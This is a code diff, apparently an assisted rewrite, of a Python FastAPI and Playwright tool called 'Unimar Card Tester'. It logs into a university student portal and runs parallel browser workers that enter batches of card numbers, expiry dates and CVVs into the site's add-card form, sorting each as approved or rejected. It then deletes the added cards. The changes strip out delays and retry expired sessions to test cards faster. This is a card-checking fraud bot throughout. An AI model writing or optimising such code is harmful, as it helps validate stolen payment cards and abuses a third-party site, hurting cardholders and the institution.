@@ -186,34 +186,43 @@ async def lifespan(app: FastAPI):
 app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)
 
 # ================= PLAYWRIGHT FLOWS =================
-async def sessao_valida(playwright) -> bool:
+async def sessao_valida(context) -> bool:
+    # ✅ CORRIGIDO: valida a sessão dentro de um contexto já existente,
+    # eliminando o boot de um navegador extra. Espere o botão
+    # explicitamente em vez de sleep fixo (evita falso negativo).
     if not SESSAO_PATH.exists():
         return False
     if time.time() - SESSAO_PATH.stat().st_mtime > SESSAO_MAX_AGE:
         return False
     try:
-        browser = await playwright.chromium.launch(headless=True, args=BROWSER_ARGS)
-        context = await browser.new_context(
-            storage_state=str(SESSAO_PATH),
-            viewport=VIEWPORT,
-            user_agent=USER_AGENT,
-        )
         page = await context.new_page()
-        await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)
-        await asyncio.sleep(0.8)
-        ok = await page.get_by_role("button", name="Adicionar Cartão de Crédito").count() > 0
-        await context.close()
-        await browser.close()
-        return ok
+        try:
+            await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)
+            try:
+                await page.get_by_role("button", name="Adicionar Cartão de Crédito") \
+                    .wait_for(state="visible", timeout=8000)
+                return True
+            except Exception:
+                return False
+        finally:
+            await page.close()
     except Exception:
-        logger.exception("Erro ao validar sessão")
+        logger.warning("Erro ao validar sessão", exc_info=True)
         return False
 
 async def limpar_cartoes(page, app: FastAPI) -> None:
     try:
         log(app, "[Faxina] Iniciando limpeza...")
-        await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
-        await asyncio.sleep(1.2)
+        # ✅ CORRIGIDO: só navega se já não estiver na página
+        if URL_MEUS_CARTOES not in page.url:
+            await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
+        # Espera os primeiros botões "Remover", se houver cartões
+        try:
+            await page.get_by_role("button", name="Remover").first \
+                .wait_for(state="visible", timeout=5000)
+        except Exception:
+            log(app, "[Faxina] Nenhum cartão para remover")
+            return
         removidos = 0
         for _ in range(50):
             if estado.cancelado:
@@ -223,7 +232,14 @@ async def limpar_cartoes(page, app: FastAPI) -> None:
                 break
             try:
                 await botoes.first.click(force=True, timeout=5000)
-                await asyncio.sleep(0.5)
+                # ✅ CORRIGIDO: espera a contagem diminuir em vez de sleep fixo
+                await page.wait_for_function(
+                    """(antes) => document.querySelectorAll(
+                        '[role="button"], button'
+                    ).length < antes""",
+                    arg=len(await page.query_selector_all("button")),
+                    timeout=5000,
+                )
                 removidos += 1
             except Exception:
                 break
@@ -231,71 +247,90 @@ async def limpar_cartoes(page, app: FastAPI) -> None:
     except Exception:
         logger.exception("[Faxina] Erro")
 
-async def login_mestre(playwright, app: FastAPI) -> bool:
+async def login_mestre(playwright, app: FastAPI, browser) -> bool:
+    # ✅ CORRIGIDO: recebe o browser já aberto (compartilhado com os workers),
+    # evitando lançar navegadores extras.
     try:
-        if await sessao_valida(playwright):
-            log(app, "[Auth] Sessão reutilizada (Modo Fast)")
-            return True
         if not EMAIL or not SENHA:
             log(app, "[ERRO] Email/senha não configurados!")
             return False
-        log(app, "[Auth] Login completo (Modo Full)...")
-        browser = await playwright.chromium.launch(headless=True, args=BROWSER_ARGS)
+
         context = await browser.new_context(viewport=VIEWPORT, user_agent=USER_AGENT)
         page = await context.new_page()
         page.on("dialog", lambda d: asyncio.create_task(d.accept()))
-        await page.goto(URL_LOGIN, wait_until="networkidle", timeout=60000)
-        await asyncio.sleep(2)
-
-        alvo_page = page
-        email_input = None
-        for _ in range(10):
-            for frame in [page] + list(page.frames):
-                try:
-                    for sel in ["input[type='email']", "input[name*='email']", "input[id*='email']", "input[placeholder*='E-mail']", "input[type='text']"]:
-                        el = frame.locator(sel).first
-                        if await el.count() > 0 and await el.is_visible():
-                            email_input = el
-                            alvo_page = frame
-                            break
-                    if email_input:
-                        break
-                except Exception:
-                    pass
-            if email_input:
-                break
-            await asyncio.sleep(1)
-
-        if not email_input:
-            log(app, "[ERRO] Campo de e-mail não encontrado.")
-            await context.close()
-            await browser.close()
-            return False
-
-        await email_input.click()
-        await email_input.fill("")
-        await email_input.type(EMAIL, delay=50)
-
-        senha_input = alvo_page.locator("input[type='password']").first
-        await senha_input.click()
-        await senha_input.fill("")
-        await senha_input.type(SENHA, delay=50)
-
-        btn = alvo_page.locator("button[type='submit'], input[type='submit'], button:has-text('ENTRAR'), button:has-text('Entrar')").first
-        await btn.click()
 
         try:
-            await page.wait_for_url("**/areadoaluno/**", timeout=30000)
-        except Exception:
-            await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)
+            # ✅ CORRIGIDO: primeiro tenta reutilizar a sessão salva no MESMO browser
+            if SESSAO_PATH.exists():
+                await context.close()
+                context = await browser.new_context(
+                    storage_state=str(SESSAO_PATH),
+                    viewport=VIEWPORT,
+                    user_agent=USER_AGENT,
+                )
+                page = await context.new_page()
+                page.on("dialog", lambda d: asyncio.create_task(d.accept()))
+                if await sessao_valida(context):
+                    log(app, "[Auth] Sessão reutilizada (Modo Fast)")
+                    await context.close()
+                    return True
+                log(app, "[Auth] Sessão expirada, fazendo login completo...")
 
-        await asyncio.sleep(2)
-        await limpar_cartoes(page, app)
-        await context.storage_state(path=str(SESSAO_PATH))
-        await context.close()
-        await browser.close()
-        log(app, "[Auth] Login concluído!")
-        return True
+            log(app, "[Auth] Login completo (Modo Full)...")
+
+            # ✅ CORRIGIDO: domcontentloaded em vez de networkidle
+            await page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=30000)
+
+            # ✅ CORRIGIDO: espera condicionada ao elemento em vez de
+            # loop de polling com sleep(1)
+            email_input = None
+            for frame in [page] + list(page.frames):
+                try:
+                    el = frame.locator(
+                        "input[type='email'], input[name*='email'], "
+                        "input[id*='email'], input[placeholder*='E-mail'], "
+                        "input[type='text']"
+                    ).first
+                    await el.wait_for(state="visible", timeout=15000)
+                    email_input = el
+                    alvo_page = frame
+                    break
+                except Exception:
+                    continue
+
+            if not email_input:
+                log(app, "[ERRO] Campo de e-mail não encontrado.")
+                await context.close()
+                return False
+
+            # ✅ CORRIGIDO: fill() instantâneo em vez de type() com delay
+            await email_input.fill(EMAIL)
+
+            senha_input = alvo_page.locator("input[type='password']").first
+            await senha_input.wait_for(state="visible", timeout=10000)
+            await senha_input.fill(SENHA)
+
+            btn = alvo_page.locator(
+                "button[type='submit'], input[type='submit'], "
+                "button:has-text('ENTRAR'), button:has-text('Entrar')"
+            ).first
+            await btn.click()
+
+            # ✅ CORRIGIDO: espera a URL mudar (evento), não sleep fixo
+            try:
+                await page.wait_for_url("**/areadoaluno/**", timeout=30000)
+            except Exception:
+                await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=15000)
+
+            # Salva a sessão ANTES da faxina (garante sessão mesmo se faxina demorar)
+            await context.storage_state(path=str(SESSAO_PATH))
+            await limpar_cartoes(page, app)
+            await context.close()
+            log(app, "[Auth] Login concluído!")
+            return True
+        except Exception:
+            await context.close()
+            raise
     except Exception:
         logger.exception("[ERRO] Login falhou")
         return False
@@ -334,42 +369,69 @@ _ERRO_KEYWORDS = [
 async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> str:
     _TIMEOUT = 15000
     try:
-        await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
-        await asyncio.sleep(random.uniform(0.4, 1.0))
+        # ✅ CORRIGIDO: só navega se não estiver na página. Grande economia
+        # por cartão, já que o worker permanece na mesma página entre cartões.
+        if URL_MEUS_CARTOES not in page.url:
+            await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
 
         url_atual = page.url
-        if "login" in url_atual.lower() or URL_MEUS_CARTOES not in url_atual:
+        if "login" in url_atual.lower():
             logger.warning("Sessão expirada! URL atual: %s", url_atual)
             return "erro:sessao_expirada"
 
-        btn_adicionar = page.locator("button:has-text('Adicionar Cartão'), button:has-text('Novo Cartão'), [role='button']:has-text('Cartão')").first
+        btn_adicionar = page.locator(
+            "button:has-text('Adicionar Cartão'), button:has-text('Novo Cartão'), "
+            "[role='button']:has-text('Cartão')"
+        ).first
         if not await btn_adicionar.count():
             btn_adicionar = page.get_by_role("button", name="Adicionar Cartão de Crédito")
         if not await btn_adicionar.count():
             return "erro:botao_adicionar_nao_encontrado"
 
-        await btn_adicionar.click(force=True, timeout=_TIMEOUT)
-        await asyncio.sleep(0.8)
-
         try:
-            num_input = page.locator("input[name*='card'], input[id*='card'], input[placeholder*='Número'], input[aria-label*='Número']").first
-            if not await num_input.count():
-                num_input = page.get_by_role("textbox", name="Número do cartão")
-            await num_input.click()
-            await num_input.fill("")
-            await num_input.type(numero, delay=30)
+            await btn_adicionar.scroll_into_view_if_needed(timeout=_TIMEOUT)
+        except Exception:
+            pass
+        await btn_adicionar.click(force=True, timeout=_TIMEOUT)
 
-            nome_input = page.locator("input[name*='name'], input[id*='name'], input[placeholder*='Nome'], input[aria-label*='Nome']").first
-            if not await nome_input.count():
-                nome_input = page.get_by_role("textbox", name="Nome impresso no cartão")
-            await nome_input.click()
-            await nome_input.fill("")
-            await nome_input.type(NOME_FIXO, delay=30)
+        # ✅ CORRIGIDO: espera o formulário aparecer em vez de sleep(0.8)
+        num_input = page.locator(
+            "input[name*='card'], input[id*='card'], "
+            "input[placeholder*='Número'], input[aria-label*='Número']"
+        ).first
+        try:
+            await num_input.wait_for(state="visible", timeout=_TIMEOUT)
+        except Exception:
+            num_input = page.get_by_role("textbox", name="Número do cartão")
+            try:
+                await num_input.wait_for(state="visible", timeout=5000)
+            except Exception:
+                return "erro:campos_numero_nome"
+
+        # ✅ CORRIGIDO: fill() instantâneo em vez de type() com delay=30
+        try:
+            await num_input.fill("")
+            await num_input.fill(numero)
         except Exception:
             return "erro:campos_numero_nome"
 
+        nome_input = page.locator(
+            "input[name*='name'], input[id*='name'], "
+            "input[placeholder*='Nome'], input[aria-label*='Nome']"
+        ).first
         try:
-            mes_el = page.locator("select[name*='month'], select[id*='month'], select[aria-label*='Mês']").first
+            await nome_input.fill(NOME_FIXO)
+        except Exception:
+            nome_input = page.get_by_role("textbox", name="Nome impresso no cartão")
+            try:
+                await nome_input.fill(NOME_FIXO)
+            except Exception:
+                return "erro:campos_numero_nome"
+
+        try:
+            mes_el = page.locator(
+                "select[name*='month'], select[id*='month'], select[aria-label*='Mês']"
+            ).first
             if await mes_el.count() > 0:
                 await mes_el.select_option(mes, timeout=_TIMEOUT)
             else:
@@ -378,7 +440,9 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
             return "erro:select_mes"
 
         try:
-            ano_el = page.locator("select[name*='year'], select[id*='year'], select[aria-label*='Ano']").first
+            ano_el = page.locator(
+                "select[name*='year'], select[id*='year'], select[aria-label*='Ano']"
+            ).first
             if await ano_el.count() > 0:
                 await ano_el.select_option(ano, timeout=_TIMEOUT)
             else:
@@ -387,12 +451,15 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
             return "erro:select_ano"
 
         try:
-            cvv_input = page.locator("input[name*='cvv'], input[name*='cvc'], input[id*='cvv'], input[placeholder*='CVV'], input[aria-label*='CVV']").first
-            if not await cvv_input.count():
+            cvv_input = page.locator(
+                "input[name*='cvv'], input[name*='cvc'], input[id*='cvv'], "
+                "input[placeholder*='CVV'], input[aria-label*='CVV']"
+            ).first
+            try:
+                await cvv_input.fill(cvv)
+            except Exception:
                 cvv_input = page.get_by_role("textbox", name="CVV")
-            await cvv_input.click()
-            await cvv_input.fill("")
-            await cvv_input.type(cvv, delay=30)
+                await cvv_input.fill(cvv)
         except Exception:
             return "erro:campo_cvv"
 
@@ -414,14 +481,34 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
         except Exception:
             return "erro:botao_registrar"
 
-        await asyncio.sleep(2.0)
-        botoes_apos = await page.get_by_role("button", name="Remover").count()
+        # ✅ CORRIGIDO: em vez de sleep(2.0) fixo, espera ATIVAMENTE algum
+        # resultado — novo botão "Remover" (aprovado) OU mensagem de erro.
+        resultado = await _aguardar_resultado(page, botoes_antes, timeout=12000)
+        if resultado is not None:
+            return resultado
 
+        return "reprovado"
+    except Exception as exc:
+        logger.exception("Erro em processar_cartao")
+        return f"erro:{type(exc).__name__}"
+
+async def _aguardar_resultado(page, botoes_antes: int, timeout: int) -> str | None:
+    """Espera polling ativo até que haja resultado (sucesso ou erro),
+    retornando assim que possível em vez de esperar tempo fixo."""
+    deadline = time.time() + timeout / 1000
+    while time.time() < deadline:
+        if estado.cancelado:
+            return "cancelado"
+
+        botoes_apos = await page.get_by_role("button", name="Remover").count()
         if botoes_apos > botoes_antes:
             return "aprovado"
 
         try:
-            erros = page.locator(".alert, .toast, .notification, [role='alert'], .error, .invalid-feedback, span[style*='color: red']")
+            erros = page.locator(
+                ".alert, .toast, .notification, [role='alert'], "
+                ".error, .invalid-feedback, span[style*='color: red']"
+            )
             if await erros.count() > 0:
                 texto = (await erros.first.inner_text()).lower()
                 if any(x in texto for x in _ERRO_KEYWORDS):
@@ -429,10 +516,8 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
         except Exception:
             pass
 
-        return "reprovado"
-    except Exception as exc:
-        logger.exception("Erro em processar_cartao")
-        return f"erro:{type(exc).__name__}"
+        await asyncio.sleep(0.15)  # polling leve (150ms), não bloqueante
+    return None
 
 async def _criar_contexto_worker(browser):
     context = await browser.new_context(
@@ -442,6 +527,9 @@ async def _criar_contexto_worker(browser):
     )
     page = await context.new_page()
     page.on("dialog", lambda d: asyncio.create_task(d.accept()))
+    # Pré-carrega a página uma única vez por contexto; processar_cartao
+    # não precisará recarregar a cada cartão
+    await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
     return context, page
 
 async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> None:
@@ -450,7 +538,8 @@ async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> 
     context = None
     page = None
     try:
-        await asyncio.sleep(id_worker * 1.2)
+        # ✅ CORRIGIDO: escalonamento reduzido (era 1.2s por canal, até 7.2s)
+        await asyncio.sleep((id_worker - 1) * 0.3)
         log(app, f"[Canal {id_worker}] Iniciando")
         context, page = await _criar_contexto_worker(browser)
 
@@ -506,6 +595,16 @@ async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> 
                     await inc_estado("tarefas_concluidas", 1)
                 elif resultado == "timeout" and tentativa < MAX_TENTATIVAS:
                     log(app, f"[Canal {id_worker}][{indice}] ⚠️ Timeout - Retentativa {tentativa + 1}")
+                    await fila.put((indice, linha, tentativa + 1))
+                    continue
+                elif resultado == "erro:sessao_expirada" and tentativa < MAX_TENTATIVAS:
+                    log(app, f"[Canal {id_worker}][{indice}] ⚠️ Sessão expirada - recriando contexto")
+                    try:
+                        if context:
+                            await context.close()
+                    except Exception:
+                        pass
+                    context, page = await _criar_contexto_worker(browser)
                     await fila.put((indice, linha, tentativa + 1))
                     continue
                 else:
@@ -573,13 +672,14 @@ async def processar_todos_cartoes(texto_cartoes: str, num_canais: int, app: Fast
             await fila.put((idx, linha, 1))
 
         async with async_playwright() as pw:
-            if not await login_mestre(pw, app):
-                log(app, "[ERRO] Falha na autenticação")
-                return
-
+            # ✅ CORRIGIDO: UM ÚNICO browser compartilhado entre login e workers
             browser = await pw.chromium.launch(headless=True, args=BROWSER_ARGS)
             app.state.browser = browser
             try:
+                if not await login_mestre(pw, app, browser):
+                    log(app, "[ERRO] Falha na autenticação")
+                    return
+
                 tasks = [asyncio.create_task(worker(i, browser, fila, app)) for i in range(1, num_canais + 1)]
                 await asyncio.gather(*tasks, return_exceptions=True)
 
